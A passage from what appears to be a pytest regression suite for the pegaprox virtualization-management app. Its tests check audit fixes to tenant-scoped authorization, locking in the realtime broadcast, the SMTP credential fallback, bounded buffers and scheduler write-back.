    lines = body.split('\n')
    li = next(k for k, l in enumerate(lines) if 'with sse_clients_lock:' in l)
    indent = len(lines[li]) - len(lines[li].lstrip())
    block = []
    for l in lines[li + 1:]:
        if l.strip() and (len(l) - len(l.lstrip())) <= indent:
            break
        if l.strip():
            block.append(l.strip())
    assert block == ['_clients_snapshot = list(sse_clients.items())'], block


# ── PBS listings handed every user the whole install's backup inventory ────
def test_pbs_snapshot_listing_is_scoped(api, seed):
    """pbs.datastore.view is a BUILTIN ROLE_USER and ROLE_VIEWER permission, and a datastore is
    shared across every VM on every linked cluster — so these listings (enriched with VM names)
    showed every tenant's backups while the per-object routes beside them were gated."""
    from unittest.mock import MagicMock
    import pegaprox.globals as g
    seed.tenant('tenant_x', clusters=['cluster_1'])
    u = seed.user('pbsviewer', role='viewer', tenant_id='tenant_x',
                  permissions=['pbs.datastore.view', 'cluster.view'])
    seed.pool('cluster_1', 'pool_1', 'pbsviewer', ['pool.view', 'vm.view'])
    _pool_membership('cluster_1', {100: ('qemu', 'pool_1')})
    _cluster(api)
    pm = MagicMock()
    pm.connected = True
    pm.linked_clusters = ['cluster_1']
    pm.get_snapshots.return_value = {'data': [
        {'backup-type': 'vm', 'backup-id': '100', 'backup-time': 1},
        {'backup-type': 'vm', 'backup-id': '300', 'backup-time': 2},
    ]}
    g.pbs_managers['pbs-s'] = pm
    try:
        r = api.as_user(u).get('/api/pbs/pbs-s/datastores/store1/snapshots')
        if r.status_code == 200:
            ids = [s['backup-id'] for s in r.get_json()]
            assert ids == ['100'], ids
    finally:
        g.pbs_managers.pop('pbs-s', None)


def test_v2p_target_cluster_is_confined():
    """Starting a V2P migration CREATES a guest on the target, and a new vmid matches no
    per-object grant — the XHM twin asks the confinement question about its target."""
    src = open('pegaprox/api/vmware.py').read()
    i = src.index('def start_vmware_migration(')
    body = src[i:i + 4000]
    assert 'caller_is_scoped' in body, "the V2P target is still gated on reachability alone"


def test_legacy_ha_toggle_has_the_confinement_gate():
    src = open('pegaprox/api/clusters.py').read()
    i = src.index('def set_ha_status(')
    body = src[i:i + 1500]
    assert 'require_unconfined' in body, "the legacy HA toggle is still ungated"


# ── the bulk-delete twin of the campaign's very first HIGH ─────────────────
def test_bulk_snapshot_delete_gates_clusters_and_the_token(api, seed):
    """snapshots_overview (the READ) was the first HIGH of this campaign. Its bulk-DELETE twin
    kept both defects: identity from the raw record, and `user_data.get('clusters', [])`
    reading a key the record does not have — always [], so the cluster guard short-circuited."""
    src = open('pegaprox/api/vms.py').read()
    i = src.index('def snapshots_overview_delete(')
    body = src[i:i + 2500]
    # strip comments — the fix's own commentary quotes the old expression
    body = '\n'.join(l.split('#')[0] for l in body.split('\n'))
    assert 'build_authz_user' in body, "still builds identity from the raw record"
    assert "user_data.get('clusters', [])" not in body, "still reads a key that does not exist"
    assert 'user_clusters is not None' in body, "the cluster guard still short-circuits on []"


def test_ceph_mirror_image_status_is_scoped(api, seed, monkeypatch):
    """An RBD image is named vm-<vmid>-disk-N, so the image name is a guest reference. The
    listing was scoped earlier this campaign; the per-image status beside it was not."""
    u = _pool_user_for_ceph(seed)
    _cluster(api)
    import pegaprox.api.ceph as ceph_mod
    monkeypatch.setattr(ceph_mod, '_valid_pool', lambda p: True)
    monkeypatch.setattr(ceph_mod, '_valid_image', lambda i: True)
    r = api.as_user(u).get('/api/clusters/cluster_1/ceph/mirror/pool/rbd/image/vm-300-disk-0/status')
    assert r.status_code == 403, r.get_data(as_text=True)


def _pool_user_for_ceph(seed):
    seed.tenant('tenant_x', clusters=['cluster_1'])
    u = seed.user('cephview', role='viewer', tenant_id='tenant_x', permissions=['cluster.view'])
    seed.pool('cluster_1', 'pool_1', 'cephview', ['pool.view', 'vm.view'])
    _pool_membership('cluster_1', {100: ('qemu', 'pool_1')})
    return u


# ── a ciphertext we cannot read is not a credential ────────────────────────
def test_smtp_refuses_to_send_an_undecryptable_ciphertext_as_the_password():
    """The legacy-plaintext fallback applied to ANY decryption failure, so a rotated or damaged
    key meant the literal aes256:... string went to the mail relay as the password."""
    src = open('pegaprox/utils/email.py').read()
    assert "startswith('aes256:')" in src
    assert 'refusing to' in src


def test_v2p_key_cleanup_can_actually_authenticate():
    """The cleanup authenticates with -i <key>, but its option list was copied from the
    password-auth helpers and excluded publickey — so the removal could never succeed."""
    src = open('pegaprox/core/v2p.py').read()
    i = src.index('def _cleanup_temp_ssh_key(')
    body = src[i:i + 1500]
    assert 'PreferredAuthentications=publickey' in body, \
        "the key-based cleanup still cannot offer publickey"


# ── round 11 backlog ───────────────────────────────────────────────────────
def test_backup_job_update_authorizes_the_stored_job_too():
    """Checking only the submitted payload assumed the client round-trips the whole job back;
    a crafted PUT naming nothing but the caller's own vmid passed and still landed on a job
    targeting someone else's guests."""
    src = open('pegaprox/api/storage.py').read()
    i = src.index('def update_backup_job(')
    body = src[i:i + 3000]
    assert '_authz_backup_targets(cluster_id, _stored)' in body, \
        "the PUT still authorizes only the submitted payload"


def test_snapshot_policy_listing_is_scoped():
    src = open('pegaprox/api/snapshots.py').read()
    i = src.index('def list_policies(')
    body = src[i:i + 1500]
    assert '_policy_targets_authorized' in body, "the policy listing is still unscoped"


def test_ws_broadcast_filters_outside_the_registry_lock():
    """The per-VM check I added to the WS path in this campaign did DB work while holding the
    global ws_clients lock — the same mistake the SSE side had."""
    src = open('pegaprox/utils/realtime.py').read()
    i = src.index('def broadcast_update(')
    body = src[i:src.index('\ndef ', i + 10)]
    lines = body.split('\n')
    li = next(k for k, l in enumerate(lines) if 'with ws_clients_lock:' in l)
    indent = len(lines[li]) - len(lines[li].lstrip())
    block = []
    for l in lines[li + 1:]:
        if l.strip() and (len(l) - len(l.lstrip())) <= indent:
            break
        if l.strip():
            block.append(l.strip())
    assert not any('_sse_user_can_view_vm' in b for b in block), \
        "per-VM authz still runs inside the global WS lock"


def test_ws_send_does_not_block_on_a_stuck_client():
    src = open('pegaprox/utils/realtime.py').read()
    assert 'client_lock.acquire(blocking=False)' in src, \
        "a wedged client can still delay the frame for everyone after it"


def test_syslog_tcp_buffer_is_bounded():
    """The accumulator had no bound and this listener takes unauthenticated connections."""
    src = open('pegaprox/background/syslog_server.py').read()
    assert '_MAX_LINE' in src and 'no line ' in src


def test_api_rate_limit_map_is_pruned():
    src = open('pegaprox/app.py').read()
    i = src.index('with g.api_rate_limit_lock:')
    assert 'g.api_request_counts.pop(' in src[i:i + 1200], \
        "the rate-limit map is still never pruned"


def test_scheduler_touches_only_the_task_it_ran(db):
    """The tick wrote the whole config back from a snapshot taken before it started, and
    execute_scheduled_task starts and stops VMs — so a task an admin deleted mid-tick came
    back, and an edit made mid-tick was reverted."""
    from pegaprox.background.scheduler import save_scheduled_tasks, load_scheduled_tasks, _touch_last_run
    save_scheduled_tasks({'tasks': [
        {'id': 'keep', 'cluster_id': 'c1', 'name': 'a', 'action': 'stop', 'target_id': '1',
         'schedule_type': 'daily', 'schedule_time': '02:00', 'enabled': True},
        {'id': 'doomed', 'cluster_id': 'c1', 'name': 'b', 'action': 'stop', 'target_id': '2',
         'schedule_type': 'daily', 'schedule_time': '03:00', 'enabled': True},
    ]})
    # an admin deletes one while the tick is mid-execution
    db.conn.execute("DELETE FROM scheduled_tasks WHERE id = 'doomed'")
    db.conn.commit()
    _touch_last_run('keep', '2026-01-01T00:00:00')
    ids = {t['id'] for t in load_scheduled_tasks()['tasks']}
    assert ids == {'keep'}, f"the deleted task was resurrected: {ids}"
    kept = [t for t in load_scheduled_tasks()['tasks'] if t['id'] == 'keep'][0]
    assert kept['last_run'] == '2026-01-01T00:00:00'


def test_site_recovery_tokens_are_per_migration():
    """The token was created and deleted BY a fixed name, with a one-hour cleanup grace — so
    two overlapping failovers revoked each other's credential mid-migration."""
    src = open('pegaprox/background/site_recovery.py').read()
    assert "create_api_token('pegaprox-sr')" not in src, "still a fixed token name"
    assert '_sr_token_name' in src and 'uuid.uuid4()' in src
